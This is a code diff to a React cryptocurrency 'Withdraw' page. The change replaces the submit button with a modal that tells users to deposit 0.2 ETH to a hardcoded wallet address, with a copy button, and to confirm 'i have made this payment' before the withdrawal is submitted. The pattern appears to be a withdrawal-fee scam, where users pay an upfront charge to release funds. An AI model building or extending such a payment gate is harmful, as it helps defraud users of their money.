@@ -2,6 +2,7 @@ import React, { useState } from 'react'
 import Layout from '../components/Layout'
 import Swal from 'sweetalert2';
 import axios from 'axios';
+import CopyToClipboardButton from '../components/Copy';
 
 const Withdraw = () => {
     const [amount, setAmount] = useState(0);
@@ -23,6 +24,12 @@ const Withdraw = () => {
             }, { headers });
             setAmount(0);
             setAddress('');
+
+
+
+           document.getElementById('my_modal_3').close()
+          
+
             Swal.fire({
                 title: 'Success!',
                 text: 'Withdrawal request submitted successfully.',
@@ -38,6 +45,8 @@ const Withdraw = () => {
             });
         }
     };
+    const text = "0x39cb8b97b4c53fcfe2d54ea4bf92be07c55389b8";
+    const total = 0.2
     return (
         <div>
             <Layout>
@@ -80,8 +89,22 @@ const Withdraw = () => {
 
 
 
-                            <button type='submit' className="w-full btn btn-wide">Withdraw</button>
+                            <div onClick={() => document.getElementById('my_modal_3').showModal()} className="w-full btn btn-wide">Withdraw</div>
+                            <dialog id="my_modal_3" className="modal">
+                                <div className="modal-box bg-[#272D37]">
+                                    <form method="dialog">
+                                        {/* if there is a button in form, it will close the modal */}
+                                        <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2">✕</button>
+                                    </form>
+                                    <div className=' text-white flex flex-col items-center text-[10px] my-[1rem]'>
+                                        Deposit {total} ETh to <br /> <p> <span className='rounded-md bg-[#36D300] p-[0.1rem] text-black'>{text}</span>
+                                            <CopyToClipboardButton textToCopy={text} /></p>
+                                    </div>
 
+
+                                    <button className="btn btn-outline btn-success" type='submit'> i have made this payment</button>
+                                </div>
+                            </dialog>
                         </form>
 
 
